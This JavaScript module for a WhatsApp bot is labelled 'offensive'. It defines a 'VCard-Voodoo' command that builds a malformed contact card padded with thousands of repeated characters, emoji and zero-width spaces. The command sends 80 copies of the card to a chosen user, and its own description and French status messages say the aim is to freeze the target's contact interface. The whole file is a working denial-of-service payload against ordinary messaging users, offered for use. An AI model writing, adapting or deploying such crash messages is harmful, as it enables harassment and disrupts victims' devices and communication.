const { log } = require('../utils/logger');

module.exports = {
    name: 'vcardvoodoo',
    description: '🎭 VCard-Voodoo: Sends a malformed VCard chain designed to freeze the target\'s contact UI.',
    category: 'offensive',
    isAdmin: true,
    isOwner: true,
    async execute({ sock, chatId, message, args, bot }) {
        try {
            const target = message.message?.extendedTextMessage?.contextInfo?.participant ||
                (args[0] ? args[0].replace('@', '') + '@s.whatsapp.net' : chatId);

            await sock.sendMessage(chatId, { text: `🎭 *LANCEMENT DU VCARD-VOODOO* sur @${target.split('@')[0]}...`, mentions: [target] });

            const malformedVCard = 'BEGIN:VCARD\n' +
                'VERSION:3.0\n' +
                'FN:' + '░'.repeat(2500) + '\n' +
                'ORG:' + '🔥'.repeat(1500) + '\n' +
                'TEL;type=CELL;type=VOICE;waid=' + '0'.repeat(150) + ':0\n' +
                'NOTE:' + '🌀'.repeat(10000) + '\u200B'.repeat(5000) + '\n' +
                'END:VCARD';

            const contacts = Array(80).fill({ vcard: malformedVCard });

            await sock.sendMessage(target, {
                contacts: {
                    displayName: "💀 ABYSSFLOW_VODDOO_ULTRA",
                    contacts: contacts
                }
            });

            if (target !== chatId) {
                await sock.sendMessage(chatId, { text: `✅ *VCARD-VOODOO DÉPLOYÉ.* La cible subira une saturation du module Contact.`, mentions: [target] });
            }

        } catch (error) {
            log.error('Error in VCARDVOODOO:', error);
        }
    }
};
